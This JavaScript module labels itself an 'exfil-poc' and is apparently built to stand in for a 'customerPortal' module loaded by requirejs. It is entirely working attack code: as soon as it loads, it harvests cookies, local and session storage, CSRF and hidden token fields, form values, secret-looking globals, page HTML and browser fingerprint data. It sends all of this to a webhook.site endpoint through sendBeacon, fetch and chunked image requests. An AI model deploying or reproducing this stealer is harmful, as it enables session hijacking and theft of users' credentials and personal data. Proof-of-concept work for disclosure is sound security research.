define([], function () {
  var WEBHOOK_URL = "https://webhook.site/ee5f90c0-44fd-49a8-9d57-4ebda535476a";
  var MAX_TEXT = 12000;
  var MAX_KEYS = 200;
  var MAX_LIST = 200;
  var MAX_TOTAL_JSON = 120000;

  function nowIso() {
    return new Date().toISOString();
  }

  function safeCall(fn, fallback) {
    try {
      return fn();
    } catch (e) {
      return fallback;
    }
  }

  function trunc(value, maxLen) {
    var s = "";
    try {
      s = String(value);
    } catch (e) {
      s = "[unserializable]";
    }
    if (s.length > maxLen) {
      return s.slice(0, maxLen) + "...[truncated]";
    }
    return s;
  }

  function toJsonSafe(value, fallback) {
    try {
      return JSON.parse(JSON.stringify(value));
    } catch (e) {
      return fallback;
    }
  }

  function collectStorage(storage, label) {
    var out = { kind: label, count: 0, entries: [] };
    if (!storage) {
      return out;
    }
    var len = safeCall(function () {
      return storage.length;
    }, 0);
    out.count = len;
    var limit = len > MAX_KEYS ? MAX_KEYS : len;
    for (var i = 0; i < limit; i++) {
      var key = safeCall(function () {
        return storage.key(i);
      }, "");
      var value = safeCall(function () {
        return storage.getItem(key);
      }, "");
      out.entries.push({
        key: trunc(key, 200),
        value: trunc(value, 2000)
      });
    }
    if (len > limit) {
      out.truncated = len - limit;
    }
    return out;
  }

  function collectCookies() {
    return {
      raw: trunc(safeCall(function () { return document.cookie; }, ""), 5000),
      split: trunc(safeCall(function () { return document.cookie; }, ""), 5000)
        .split(";")
        .map(function (part) { return part.trim(); })
        .filter(function (part) { return part.length > 0; })
        .slice(0, MAX_LIST)
    };
  }

  function collectMetaAndHiddenInputs() {
    var meta = [];
    var metas = safeCall(function () {
      return document.querySelectorAll("meta[name],meta[property],meta[http-equiv]");
    }, []);
    for (var i = 0; i < metas.length && i < MAX_LIST; i++) {
      var m = metas[i];
      meta.push({
        key: trunc(
          m.getAttribute("name") || m.getAttribute("property") || m.getAttribute("http-equiv") || "",
          200
        ),
        value: trunc(m.getAttribute("content") || "", 1500)
      });
    }

    var hidden = [];
    var inputs = safeCall(function () {
      return document.querySelectorAll("input[type='hidden'],input[name*='token' i],input[name*='csrf' i]");
    }, []);
    for (var j = 0; j < inputs.length && j < MAX_LIST; j++) {
      var inp = inputs[j];
      hidden.push({
        name: trunc(inp.name || "", 200),
        id: trunc(inp.id || "", 200),
        value: trunc(inp.value || "", 2000)
      });
    }
    return { meta: meta, hiddenInputs: hidden };
  }

  function collectForms() {
    var formsOut = [];
    var forms = safeCall(function () {
      return document.forms || [];
    }, []);
    for (var i = 0; i < forms.length && i < 60; i++) {
      var f = forms[i];
      var fields = [];
      var elems = f.elements || [];
      for (var j = 0; j < elems.length && j < 120; j++) {
        var el = elems[j];
        fields.push({
          name: trunc(el.name || "", 200),
          id: trunc(el.id || "", 200),
          type: trunc(el.type || "", 80),
          value: trunc(el.value || "", 800)
        });
      }
      formsOut.push({
        id: trunc(f.id || "", 200),
        name: trunc(f.name || "", 200),
        action: trunc(f.action || "", 1000),
        method: trunc(f.method || "", 40),
        fields: fields
      });
    }
    return formsOut;
  }

  function collectDomQuickView() {
    var html = safeCall(function () { return document.documentElement.outerHTML; }, "");
    var text = safeCall(function () { return document.body ? document.body.innerText : ""; }, "");
    return {
      title: trunc(document.title || "", 300),
      htmlPrefix: trunc(html, MAX_TEXT),
      bodyTextPrefix: trunc(text, MAX_TEXT),
      links: safeCall(function () {
        var arr = [];
        var nodes = document.querySelectorAll("a[href]");
        for (var i = 0; i < nodes.length && i < MAX_LIST; i++) {
          arr.push({
            href: trunc(nodes[i].href || "", 1200),
            text: trunc(nodes[i].innerText || nodes[i].textContent || "", 200)
          });
        }
        return arr;
      }, [])
    };
  }

  function collectScripts() {
    return safeCall(function () {
      var arr = [];
      var nodes = document.querySelectorAll("script[src]");
      for (var i = 0; i < nodes.length && i < MAX_LIST; i++) {
        arr.push(trunc(nodes[i].src || "", 1200));
      }
      return arr;
    }, []);
  }

  function collectGlobalCandidates() {
    var patterns = /(token|auth|jwt|session|csrf|secret|apikey|api_key|bearer|sid|nonce)/i;
    var out = [];
    var keys = [];
    try {
      keys = Object.keys(window);
    } catch (e) {}
    for (var i = 0; i < keys.length && out.length < 80; i++) {
      var key = keys[i];
      if (!patterns.test(key)) {
        continue;
      }
      var val = safeCall(function () {
        return window[key];
      }, "[error]");
      out.push({
        key: trunc(key, 150),
        type: typeof val,
        value: trunc(toJsonSafe(val, String(val)), 1200)
      });
    }
    return out;
  }

  function collectPerf() {
    return safeCall(function () {
      var entries = performance.getEntries ? performance.getEntries() : [];
      var out = [];
      for (var i = 0; i < entries.length && i < MAX_LIST; i++) {
        var e = entries[i];
        out.push({
          name: trunc(e.name || "", 1200),
          type: trunc(e.entryType || "", 80),
          duration: e.duration,
          transferSize: e.transferSize
        });
      }
      return {
        timing: toJsonSafe(performance.timing || {}, {}),
        nav: toJsonSafe(performance.navigation || {}, {}),
        entries: out
      };
    }, { entries: [] });
  }

  function collectNavigator() {
    var n = window.navigator || {};
    var c = n.connection || n.mozConnection || n.webkitConnection || {};
    return {
      userAgent: trunc(n.userAgent || "", 600),
      language: n.language,
      languages: toJsonSafe(n.languages || [], []),
      platform: n.platform,
      vendor: n.vendor,
      cookieEnabled: n.cookieEnabled,
      doNotTrack: n.doNotTrack,
      onLine: n.onLine,
      webdriver: n.webdriver,
      hardwareConcurrency: n.hardwareConcurrency,
      deviceMemory: n.deviceMemory,
      maxTouchPoints: n.maxTouchPoints,
      connection: {
        effectiveType: c.effectiveType,
        downlink: c.downlink,
        rtt: c.rtt,
        saveData: c.saveData
      }
    };
  }

  function collectScreen() {
    var s = window.screen || {};
    return {
      width: s.width,
      height: s.height,
      availWidth: s.availWidth,
      availHeight: s.availHeight,
      colorDepth: s.colorDepth,
      pixelDepth: s.pixelDepth,
      pixelRatio: window.devicePixelRatio
    };
  }

  function collectLocation() {
    return {
      href: trunc(window.location.href || "", 2000),
      origin: trunc(window.location.origin || "", 600),
      protocol: window.location.protocol,
      host: window.location.host,
      pathname: trunc(window.location.pathname || "", 1000),
      search: trunc(window.location.search || "", 2000),
      hash: trunc(window.location.hash || "", 2000),
      referrer: trunc(document.referrer || "", 2000),
      historyLength: safeCall(function () { return window.history.length; }, -1)
    };
  }

  function collectRequireContext() {
    return safeCall(function () {
      var r = window.requirejs && window.requirejs.find ? window.requirejs.find("customerPortal") : null;
      if (!r || !r.matches || !r.matches[0]) {
        return { found: false };
      }
      var m = r.matches[0];
      var js = m.filetypes && m.filetypes.js ? m.filetypes.js : {};
      return {
        found: true,
        moduleVersion: trunc(m.str || "", 200),
        moduleUrl: trunc((js.urls && js.urls[0]) || "", 1500)
      };
    }, { found: false });
  }

  function collectCacheStorageData() {
    if (!window.caches || !window.caches.keys) {
      return Promise.resolve({ available: false });
    }
    return window.caches.keys().then(function (names) {
      var output = { available: true, cacheNames: names.slice(0, 30), sampleRequests: [] };
      var jobs = [];
      for (var i = 0; i < names.length && i < 5; i++) {
        (function (cacheName) {
          jobs.push(
            window.caches.open(cacheName).then(function (cache) {
              return cache.keys().then(function (reqs) {
                for (var j = 0; j < reqs.length && j < 50; j++) {
                  output.sampleRequests.push(trunc(reqs[j].url, 1400));
                }
              });
            })
          );
        })(names[i]);
      }
      return Promise.all(jobs).then(function () { return output; });
    }).catch(function (e) {
      return { available: true, error: trunc(e && e.message ? e.message : e, 300) };
    });
  }

  function collectIndexedDbData() {
    if (!window.indexedDB || !window.indexedDB.databases) {
      return Promise.resolve({ available: false });
    }
    return window.indexedDB.databases().then(function (dbs) {
      var out = [];
      for (var i = 0; i < dbs.length && i < 40; i++) {
        out.push({
          name: trunc(dbs[i].name || "", 300),
          version: dbs[i].version
        });
      }
      return { available: true, databases: out };
    }).catch(function (e) {
      return { available: true, error: trunc(e && e.message ? e.message : e, 300) };
    });
  }

  function collectServiceWorkers() {
    if (!navigator.serviceWorker || !navigator.serviceWorker.getRegistrations) {
      return Promise.resolve({ available: false });
    }
    return navigator.serviceWorker.getRegistrations().then(function (regs) {
      var out = [];
      for (var i = 0; i < regs.length && i < 20; i++) {
        out.push({
          scope: trunc(regs[i].scope || "", 1200),
          activeScript: regs[i].active ? trunc(regs[i].active.scriptURL || "", 1200) : null
        });
      }
      return {
        available: true,
        controller: navigator.serviceWorker.controller
          ? trunc(navigator.serviceWorker.controller.scriptURL || "", 1200)
          : null,
        registrations: out
      };
    }).catch(function (e) {
      return { available: true, error: trunc(e && e.message ? e.message : e, 300) };
    });
  }

  function collectPermissions() {
    if (!navigator.permissions || !navigator.permissions.query) {
      return Promise.resolve({ available: false });
    }
    var names = [
      "geolocation",
      "notifications",
      "microphone",
      "camera",
      "clipboard-read",
      "clipboard-write",
      "persistent-storage",
      "background-sync"
    ];
    var out = { available: true, states: {} };
    var jobs = [];
    for (var i = 0; i < names.length; i++) {
      (function (name) {
        jobs.push(
          navigator.permissions.query({ name: name }).then(function (status) {
            out.states[name] = status.state;
          }).catch(function () {
            out.states[name] = "unsupported_or_error";
          })
        );
      })(names[i]);
    }
    return Promise.all(jobs).then(function () { return out; });
  }

  function encodeBase64Utf8(str) {
    try {
      return btoa(unescape(encodeURIComponent(str)));
    } catch (e) {
      return "";
    }
  }

  function sendChunks(base64Payload) {
    var chunkSize = 1400;
    var total = Math.ceil(base64Payload.length / chunkSize);
    for (var i = 0; i < total; i++) {
      var chunk = base64Payload.slice(i * chunkSize, (i + 1) * chunkSize);
      var img = new Image();
      img.src =
        WEBHOOK_URL +
        "?event=cp_loader_chunk" +
        "&ts=" + encodeURIComponent(nowIso()) +
        "&idx=" + i +
        "&total=" + total +
        "&d=" + encodeURIComponent(chunk);
    }
  }

  function sendPayload(payload) {
    var serialized = safeCall(function () {
      return JSON.stringify(payload);
    }, "{}");

    if (serialized.length > MAX_TOTAL_JSON) {
      serialized = serialized.slice(0, MAX_TOTAL_JSON) + '...{"truncated":true}';
    }

    var b64 = encodeBase64Utf8(serialized);
    var beaconSent = false;

    try {
      if (navigator.sendBeacon) {
        beaconSent = navigator.sendBeacon(WEBHOOK_URL, serialized);
      }
    } catch (e) {}

    if (!beaconSent) {
      try {
        fetch(WEBHOOK_URL, {
          method: "POST",
          mode: "no-cors",
          credentials: "omit",
          keepalive: true,
          headers: { "content-type": "text/plain;charset=UTF-8" },
          body: serialized
        });
      } catch (e) {}
    }

    if (b64) {
      sendChunks(b64);
    }
  }

  function collectAll() {
    var base = {
      marker: {
        executed: true,
        ts: nowIso(),
        victimOrigin: window.location.origin,
        victimHref: window.location.href,
        documentDomain: document.domain
      },
      location: collectLocation(),
      cookies: collectCookies(),
      localStorage: collectStorage(window.localStorage, "localStorage"),
      sessionStorage: collectStorage(window.sessionStorage, "sessionStorage"),
      dom: collectDomQuickView(),
      forms: collectForms(),
      metaAndHidden: collectMetaAndHiddenInputs(),
      scripts: collectScripts(),
      navigator: collectNavigator(),
      screen: collectScreen(),
      performance: collectPerf(),
      requireContext: collectRequireContext(),
      globalsCandidates: collectGlobalCandidates()
    };

    return Promise.all([
      collectCacheStorageData(),
      collectIndexedDbData(),
      collectServiceWorkers(),
      collectPermissions()
    ]).then(function (extra) {
      base.cacheStorage = extra[0];
      base.indexedDB = extra[1];
      base.serviceWorkers = extra[2];
      base.permissions = extra[3];
      return base;
    }).catch(function (e) {
      base.extraCollectionError = trunc(e && e.message ? e.message : e, 400);
      return base;
    });
  }

  function executeExfil() {
    var marker = {
      executed: true,
      ts: nowIso(),
      origin: window.location.origin,
      href: window.location.href
    };
    window.__CP_POC_MARKER__ = marker;
    try {
      localStorage.setItem("cp_poc_marker", JSON.stringify(marker));
    } catch (e) {}

    collectAll().then(function (payload) {
      sendPayload(payload);
    }).catch(function (e) {
      sendPayload({
        marker: marker,
        error: trunc(e && e.message ? e.message : e, 300)
      });
    });

    return marker;
  }

  executeExfil();

  return {
    version: "100.0.0-exfil-poc",
    render: function () {
      return executeExfil();
    }
  };
});
